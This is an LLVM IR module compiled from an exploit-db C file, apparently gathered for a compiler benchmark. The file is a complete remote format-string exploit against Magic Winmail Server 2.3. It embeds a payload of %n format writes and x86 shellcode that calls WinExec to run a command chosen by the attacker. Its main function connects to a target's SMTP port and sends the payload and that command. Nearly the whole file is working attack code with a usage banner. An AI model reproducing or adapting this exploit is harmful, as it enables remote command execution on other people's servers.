; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_42.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_42.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }

@__const.main.vuln = private unnamed_addr constant [167 x i8] c"\EC\FCf\01%x%x\ED\FCf\01%x%x\EE\FCf\01%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%28x%n%97x%n%105x%hn\00\90\90\90\90\EBP^\8B\EC\83\EC(\C7E\D8Kern\C7E\DCel32\C7E\E0\00\00\00\00\C7E\E4WinE\C7E\E8xec\00\C6E\EB\00\BA\AC\01M\00\8DE\D8P\FF\12\8D]\E4SP\BA\EC\00M\00\FF\12j\01V\FF\D0\BA\98\01M\00\FF\12\E8\AB\FF\FF\FF\00", align 16
@.str = private unnamed_addr constant [187 x i8] c"* #################################### *\0A  Magic Winmail Server 2.3(Build 0402)\0A     Remote format string exploit !\0A* #################################### *\0A  Coded By ThreaT -> ThreaT\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [121 x i8] c"usage : mwmxploit <Target IP> <command to execute> [smtp port]\0A\0A + The command to execute cannot exceed 90 characters +\0A\00", align 1
@.str.2 = private unnamed_addr constant [35 x i8] c"Erreur d'initialisation winsock !\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@INADDR_NONE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [53 x i8] c"Erreur : L'adresse IP de la victime est incorrect !\0A\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"connecting to %s on port %u...\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [33 x i8] c"erreur : connexion impossible !\0A\00", align 1
@.str.6 = private unnamed_addr constant [33 x i8] c"ok\0A-> %s\0Asending exploit code...\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.8 = private unnamed_addr constant [3 x i8] c"ok\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca [1000 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca [167 x i8], align 16
  %9 = alloca %struct.TYPE_4__, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %12 = bitcast [167 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %12, i8* align 16 getelementptr inbounds ([167 x i8], [167 x i8]* @__const.main.vuln, i32 0, i32 0), i64 167, i1 false)
  %13 = call i32 @MAKEWORD(i32 2, i32 0)
  store i32 %13, i32* %11, align 4
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([187 x i8], [187 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %3, align 4
  %16 = icmp slt i32 %15, 3
  br i1 %16, label %23, label %17

17:                                               ; preds = %2
  %18 = load i8**, i8*** %4, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 2
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @strlen(i8* %20)
  %22 = icmp sgt i32 %21, 90
  br i1 %22, label %23, label %26

23:                                               ; preds = %17, %2
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([121 x i8], [121 x i8]* @.str.1, i64 0, i64 0))
  %25 = call i32 @ExitProcess(i32 0)
  br label %26

26:                                               ; preds = %23, %17
  %27 = load i32, i32* %11, align 4
  %28 = call i64 @WSAStartup(i32 %27, i32* %10)
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %30, label %33

30:                                               ; preds = %26
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.2, i64 0, i64 0))
  %32 = call i32 @ExitProcess(i32 1)
  br label %33

33:                                               ; preds = %30, %26
  %34 = load i32, i32* @AF_INET, align 4
  %35 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %9, i32 0, i32 2
  store i32 %34, i32* %35, align 4
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 3
  %38 = load i8*, i8** %37, align 8
  %39 = icmp ne i8* %38, null
  br i1 %39, label %40, label %45

40:                                               ; preds = %33
  %41 = load i8**, i8*** %4, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 3
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @atoi(i8* %43)
  br label %46

45:                                               ; preds = %33
  br label %46

46:                                               ; preds = %45, %40
  %47 = phi i32 [ %44, %40 ], [ 25, %45 ]
  %48 = call i32 @htons(i32 %47)
  %49 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %9, i32 0, i32 0
  store i32 %48, i32* %49, align 4
  %50 = load i8**, i8*** %4, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @inet_addr(i8* %52)
  %54 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %9, i32 0, i32 1
  %55 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %54, i32 0, i32 0
  store i32 %53, i32* %55, align 4
  %56 = load i32, i32* @INADDR_NONE, align 4
  %57 = icmp eq i32 %53, %56
  br i1 %57, label %58, label %61

58:                                               ; preds = %46
  %59 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.3, i64 0, i64 0))
  %60 = call i32 @ExitProcess(i32 2)
  br label %61

61:                                               ; preds = %58, %46
  %62 = load i8**, i8*** %4, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 1
  %64 = load i8*, i8** %63, align 8
  %65 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %9, i32 0, i32 0
  %66 = load i32, i32* %65, align 4
  %67 = call i32 @ntohs(i32 %66)
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i64 0, i64 0), i8* %64, i32 %67)
  %69 = load i32, i32* @AF_INET, align 4
  %70 = load i32, i32* @SOCK_STREAM, align 4
  %71 = call i32 @socket(i32 %69, i32 %70, i32 0)
  store i32 %71, i32* %5, align 4
  %72 = load i32, i32* %5, align 4
  %73 = bitcast %struct.TYPE_4__* %9 to i32*
  %74 = call i64 @connect(i32 %72, i32* %73, i32 12)
  %75 = icmp ne i64 %74, 0
  br i1 %75, label %76, label %79

76:                                               ; preds = %61
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0))
  %78 = call i32 @ExitProcess(i32 3)
  br label %79

79:                                               ; preds = %76, %61
  %80 = load i32, i32* %5, align 4
  %81 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %82 = call i32 @recv(i32 %80, i8* %81, i32 1000, i32 0)
  %83 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.6, i64 0, i64 0), i8* %83)
  %85 = load i32, i32* %5, align 4
  %86 = getelementptr inbounds [167 x i8], [167 x i8]* %8, i64 0, i64 0
  %87 = getelementptr inbounds [167 x i8], [167 x i8]* %8, i64 0, i64 0
  %88 = call i32 @strlen(i8* %87)
  %89 = add nsw i32 %88, 92
  %90 = call i32 @send(i32 %85, i8* %86, i32 %89, i32 0)
  %91 = load i32, i32* %5, align 4
  %92 = load i8**, i8*** %4, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 2
  %94 = load i8*, i8** %93, align 8
  %95 = load i8**, i8*** %4, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 2
  %97 = load i8*, i8** %96, align 8
  %98 = call i32 @strlen(i8* %97)
  %99 = call i32 @send(i32 %91, i8* %94, i32 %98, i32 0)
  %100 = load i32, i32* %5, align 4
  %101 = call i32 @send(i32 %100, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32 2, i32 0)
  %102 = load i32, i32* %5, align 4
  %103 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %104 = call i32 @recv(i32 %102, i8* %103, i32 1000, i32 0)
  %105 = call i32 @puts(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.8, i64 0, i64 0))
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @MAKEWORD(i32, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @ExitProcess(i32) #2

declare dso_local i64 @WSAStartup(i32, i32*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @ntohs(i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i64 @connect(i32, i32*, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @puts(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
